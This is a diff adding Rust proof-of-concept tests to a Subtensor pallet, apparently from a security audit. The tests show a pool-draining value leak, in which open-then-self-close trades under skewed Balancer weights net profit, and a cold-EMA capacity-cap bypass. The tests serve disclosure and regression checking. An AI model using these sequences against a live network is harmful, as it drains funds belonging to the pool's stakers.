@@ -1,0 +1,237 @@
+diff --git a/pallets/subtensor/src/tests/derivatives.rs b/pallets/subtensor/src/tests/derivatives.rs
+index 2a02b13..10ab140 100644
+--- a/pallets/subtensor/src/tests/derivatives.rs
++++ b/pallets/subtensor/src/tests/derivatives.rs
+@@ -2396,3 +2396,232 @@ fn crossover_nudge_does_not_inflate_a_ref_or_capacity() {
+         );
+     });
+ }
++
++// ===========================================================================
++// PoC (FINDING-01): self-cover close prices the buyback with the WEIGHTED engine
++// while open books the liability with NAIVE constant-product math. Under a
++// Balancer weight skew (w1/w2 < 1 for shorts) an open + immediate self-close at
++// an UNCHANGED price drains ~N*(1-w1/w2) TAO from the subnet pool to the trader.
++// Expected (sound) outcome: trader gets back ~floor P (delta ~ -fee). Observed:
++// trader nets a large profit. The conservation assert is written for the SOUND
++// outcome so a FAILURE proves the leak (magnitude printed).
++// ===========================================================================
++#[test]
++fn poc_short_self_close_leaks_under_skewed_weights() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_market(1_000_000 * TAO, 1_000_000 * TAO, 1.0);
++        // Skew Balancer weights so spot price = 0.5 (w1/w2 = 0.5) with equal
++        // reserves — the short leak side. Fee 0 isolates the leak from swap fees.
++        skew_pool(netuid, 0.5, 0);
++
++        let trader = U256::from(10);
++        let hot = U256::from(11);
++        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
++
++        let bal0 = bal(&trader);
++        let pool0 = SubnetTAO::<Test>::get(netuid).to_u64();
++        let iss0 = TotalIssuance::<Test>::get().to_u64();
++
++        assert_ok!(SubtensorModule::open_short(
++            RuntimeOrigin::signed(trader),
++            hot,
++            netuid,
++            t(1_000 * TAO),
++            None
++        ));
++        // Immediate FULL cash-settled self-close: no price move, no decay.
++        assert_ok!(SubtensorModule::do_close_short_self(
++            RuntimeOrigin::signed(trader),
++            netuid,
++            1_000_000_000,
++            None
++        ));
++
++        let trader_delta = bal(&trader) as i128 - bal0 as i128;
++        let pool_delta = SubnetTAO::<Test>::get(netuid).to_u64() as i128 - pool0 as i128;
++        let iss_delta = TotalIssuance::<Test>::get().to_u64() as i128 - iss0 as i128;
++        println!("[POC] trader balance delta = {trader_delta} rao ({:.4} TAO)", trader_delta as f64 / 1e9);
++        println!("[POC] subnet pool   delta = {pool_delta} rao ({:.4} TAO)", pool_delta as f64 / 1e9);
++        println!("[POC] TotalIssuance delta = {iss_delta} rao");
++        println!("[POC] custody left = {}", custody_bal(netuid));
++
++        // SOUND invariant: an open + instant self-close with no price move must
++        // return ~floor P, i.e. the trader must NOT profit. A failure here with a
++        // large positive delta is the value-leak proof.
++        assert!(
++            trader_delta <= TAO as i128,
++            "FINDING-01 LEAK: trader extracted {trader_delta} rao ({:.4} TAO) from the pool via \
++             self-close under skewed weights, no price move",
++            trader_delta as f64 / 1e9
++        );
++    });
++}
++
++#[test]
++fn poc_short_self_close_leaks_small_skew() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_market(10_000_000 * TAO, 10_000_000 * TAO, 1.0);
++        skew_pool(netuid, 0.99, 0); // near-default drift: w1 ≈ 0.4975 (leak side w1/w2<1)
++        SubtensorModule::set_short_kappa_ppb(900_000_000);
++        let trader = U256::from(10);
++        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
++        let bal0 = bal(&trader);
++        assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, t(100_000 * TAO), None));
++        assert_ok!(SubtensorModule::do_close_short_self(RuntimeOrigin::signed(trader), netuid, 1_000_000_000, None));
++        let delta = bal(&trader) as i128 - bal0 as i128;
++        println!("[POC-SMALLSKEW] r=0.99, P=100k: trader delta = {delta} rao ({:.2} TAO)", delta as f64 / 1e9);
++        assert!(delta <= TAO as i128, "leak at near-default skew r=0.99: trader extracted {delta} rao");
++    });
++}
++
++#[test]
++fn poc_long_self_close_leaks_under_skewed_weights() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_long(1_000_000 * TAO, 1_000_000 * TAO, 1.0);
++        skew_pool(netuid, 2.0, 0); // long leak side is the opposite skew: w1/w2 > 1
++        SubtensorModule::set_long_kappa_ppb(900_000_000);
++        let trader = U256::from(10);
++        let hot = U256::from(11);
++        give_alpha(hot, trader, netuid, AlphaBalance::from(2_000_000 * TAO));
++        let stake0 = SubtensorModule::get_stake_for_hotkey_and_coldkey_on_subnet(&hot, &trader, netuid).to_u64();
++        assert_ok!(SubtensorModule::open_long(RuntimeOrigin::signed(trader), hot, netuid, AlphaBalance::from(1_000 * TAO), None));
++        assert_ok!(SubtensorModule::do_close_long_self(RuntimeOrigin::signed(trader), netuid, 1_000_000_000, None));
++        let stake1 = SubtensorModule::get_stake_for_hotkey_and_coldkey_on_subnet(&hot, &trader, netuid).to_u64();
++        let delta = stake1 as i128 - stake0 as i128;
++        println!("[POC-LONG] r=2.0: trader alpha-stake delta = {delta} rao ({:.4} alpha)", delta as f64 / 1e9);
++        assert!(delta <= TAO as i128, "FINDING-01 LONG LEAK: trader minted {delta} rao alpha via long self-close under skewed weights");
++    });
++}
++
++// CONTROL: the SAME open+self-close flow at exactly 0.5/0.5 weights must NOT leak.
++// Proves the leak is caused by the weight skew, not by the flow itself / a test artifact.
++#[test]
++fn poc_baseline_no_skew_no_leak() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_market(1_000_000 * TAO, 1_000_000 * TAO, 1.0);
++        skew_pool(netuid, 1.0, 0); // price 1.0 + equal reserves => weights exactly 0.5/0.5 (r=1)
++        let trader = U256::from(10);
++        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
++        let bal0 = bal(&trader);
++        assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, t(1_000 * TAO), None));
++        assert_ok!(SubtensorModule::do_close_short_self(RuntimeOrigin::signed(trader), netuid, 1_000_000_000, None));
++        let delta = bal(&trader) as i128 - bal0 as i128;
++        println!("[POC-BASELINE] r=1.0 control: trader delta = {delta} rao ({:.6} TAO)", delta as f64 / 1e9);
++        assert!(delta.abs() <= TAO as i128, "control failed: 0.5/0.5 round-trip leaked {delta} rao (expected ~0)");
++    });
++}
++
++// SUSTAINED: repeating the round-trip drains the pool proportionally (not a one-off artifact).
++#[test]
++fn poc_repeat_drain() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_market(10_000_000 * TAO, 10_000_000 * TAO, 1.0);
++        skew_pool(netuid, 0.5, 0);
++        let trader = U256::from(10);
++        let hot = U256::from(11);
++        add_balance_to_coldkey_account(&trader, t(5_000_000 * TAO));
++        let pool0 = SubnetTAO::<Test>::get(netuid).to_u64();
++        let bal0 = bal(&trader);
++        for _ in 0..5 {
++            assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), hot, netuid, t(1_000 * TAO), None));
++            assert_ok!(SubtensorModule::do_close_short_self(RuntimeOrigin::signed(trader), netuid, 1_000_000_000, None));
++        }
++        let gained = bal(&trader) as i128 - bal0 as i128;
++        let drained = pool0 as i128 - SubnetTAO::<Test>::get(netuid).to_u64() as i128;
++        println!("[POC-REPEAT] 5x round-trip: attacker gained {gained} rao ({:.2} TAO); pool drained {drained} rao", gained as f64 / 1e9);
++        assert!(gained <= TAO as i128, "sustained drain: attacker netted {gained} rao over 5 round-trips with no price move");
++    });
++}
++
++// REACHABILITY: start at a clean 0.5/0.5 pool, then drift the weights off 0.5 using ONLY the
++// production per-block emission injection (`adjust_protocol_liquidity`, exactly as run_coinbase
++// calls it) — NO artificial skew_pool — and show the exploit then opens up. This proves the
++// skewed-weight precondition arises from normal protocol operation, not a contrived test state.
++#[test]
++fn poc_emission_drift_then_leak() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_market(1_000_000 * TAO, 1_000_000 * TAO, 1.0);
++        skew_pool(netuid, 1.0, 0); // start EXACTLY 0.5/0.5 (no leak at baseline)
++        let sa = SubtensorModule::get_subnet_account_id(netuid).unwrap();
++        // Per-block protocol emission injection, TAO-heavy (injection ratio != reserve ratio) to
++        // drive w_quote > 0.5 i.e. w1/w2 < 1 (the SHORT-leak side). Alpha-heavy drift gives w1/w2 > 1
++        // (the LONG-leak side) — either drift direction leaves one side exploitable.
++        for _ in 0..60 {
++            let (dt, da) = <Test as pallet::Config>::SwapInterface::adjust_protocol_liquidity(
++                netuid.into(), t(25_000 * TAO), AlphaBalance::from(5_000 * TAO));
++            SubnetTAO::<Test>::mutate(netuid, |x| *x = x.saturating_add(dt));
++            SubnetAlphaIn::<Test>::mutate(netuid, |x| *x = x.saturating_add(da));
++            add_balance_to_coldkey_account(&sa, dt);
++        }
++        let w_quote = pallet_subtensor_swap::SwapBalancer::<Test>::get(netuid).get_quote_weight().deconstruct() as f64 / 1e18;
++        println!("[POC-DRIFT] after 60 emission injections: w_quote = {:.4} (w1/w2 = {:.4})", w_quote, (1.0 - w_quote) / w_quote);
++        assert!((w_quote - 0.5).abs() > 0.02, "drift did not move weights enough: w_quote={w_quote}");
++        SubnetAlphaInMovingReserve::<Test>::insert(netuid, U64F64::from_num(SubnetAlphaIn::<Test>::get(netuid).to_u64()));
++        let trader = U256::from(10);
++        let hot = U256::from(11);
++        add_balance_to_coldkey_account(&trader, t(5_000_000 * TAO));
++        let bal0 = bal(&trader);
++        assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), hot, netuid, t(50_000 * TAO), None));
++        assert_ok!(SubtensorModule::do_close_short_self(RuntimeOrigin::signed(trader), netuid, 1_000_000_000, None));
++        let delta = bal(&trader) as i128 - bal0 as i128;
++        println!("[POC-DRIFT] exploit after NATURAL emission drift: trader delta = {delta} rao ({:.2} TAO)", delta as f64 / 1e9);
++        assert!(delta <= TAO as i128, "leak after emission-driven drift (no skew_pool): trader extracted {delta} rao");
++    });
++}
++
++// FEE CONTROL: the leak persists net of a realistic swap fee (~3%), which works AGAINST the
++// attacker (it is charged on the buyback). Kills the "the swap fee absorbs the asymmetry" objection.
++#[test]
++fn poc_short_self_close_leaks_with_fee() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = setup_market(1_000_000 * TAO, 1_000_000 * TAO, 1.0);
++        skew_pool(netuid, 0.5, 2_000); // r=0.5 AND ~3% swap fee (2000/65535)
++        let trader = U256::from(10);
++        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
++        let bal0 = bal(&trader);
++        assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, t(1_000 * TAO), None));
++        assert_ok!(SubtensorModule::do_close_short_self(RuntimeOrigin::signed(trader), netuid, 1_000_000_000, None));
++        let delta = bal(&trader) as i128 - bal0 as i128;
++        println!("[POC-FEE] r=0.5, ~3% fee: trader delta = {delta} rao ({:.2} TAO)", delta as f64 / 1e9);
++        assert!(delta <= TAO as i128, "leak persists net of ~3% swap fee: trader extracted {delta} rao");
++    });
++}
++
++// FINDING-02 (cold-EMA gap): on a FRESH dynamic subnet the A_EMA/price-EMA are still 0 (no init at
++// subnet creation; the migration only seeds existing subnets), so short_t_ref falls back to the LIVE,
++// in-block-manipulable reserve. The in-block capacity sandwich that `sandwich_open_cannot_breach_
++// capacity_cap` proves IMPOSSIBLE on a warm subnet (T_ref pinned to the lagged A_EMA) SUCCEEDS here.
++#[test]
++fn poc_cold_ema_breaches_capacity_cap() {
++    new_test_ext(1).execute_with(|| {
++        let netuid = add_dynamic_network(&U256::from(2), &U256::from(1));
++        setup_reserves(netuid, t(1500 * TAO), AlphaBalance::from(1000 * TAO));
++        let sa = SubtensorModule::get_subnet_account_id(netuid).unwrap();
++        add_balance_to_coldkey_account(&sa, t(1_000_000 * TAO));
++        SubtensorModule::set_shorts_enabled(true);
++        SubtensorModule::set_short_kappa_ppb(80_000_000); // κ = 0.08
++        assert_eq!(SubtensorModule::get_moving_alpha_price(netuid), 0); // COLD ⇒ T_ref = t_live
++
++        let honest_cap = SubtensorModule::get_subnet_short_state(netuid).unwrap().footprint_cap.to_u64();
++        let p = t(200 * TAO);
++        let trader = U256::from(10);
++        add_balance_to_coldkey_account(&trader, t(2_000_000 * TAO));
++
++        // CONTROL: at the honest reserve the open exceeds κ·T_ref ⇒ rejected.
++        assert_noop!(
++            SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, p, None),
++            Error::<Test>::ShortCapacityExceeded
++        );
++
++        // SANDWICH: pump the live TAO reserve in-block. No lagged A_EMA to pin T_ref on a cold subnet,
++        // so T_ref tracks the pumped reserve and the cap inflates.
++        setup_reserves(netuid, t(5000 * TAO), AlphaBalance::from(1000 * TAO));
++        let pumped_cap = SubtensorModule::get_subnet_short_state(netuid).unwrap().footprint_cap.to_u64();
++        println!("[COLD-EMA] honest cap = {} TAO -> pumped cap = {} TAO", honest_cap / TAO, pumped_cap / TAO);
++        assert!(pumped_cap > honest_cap, "cold T_ref must track the live pump");
++
++        // The SAME over-cap open now SUCCEEDS — risk-limit bypass via the cold-EMA fallback.
++        assert_ok!(SubtensorModule::open_short(RuntimeOrigin::signed(trader), U256::from(11), netuid, p, None));
++        assert!(ShortPositions::<Test>::get(netuid, trader).is_some());
++    });
++}
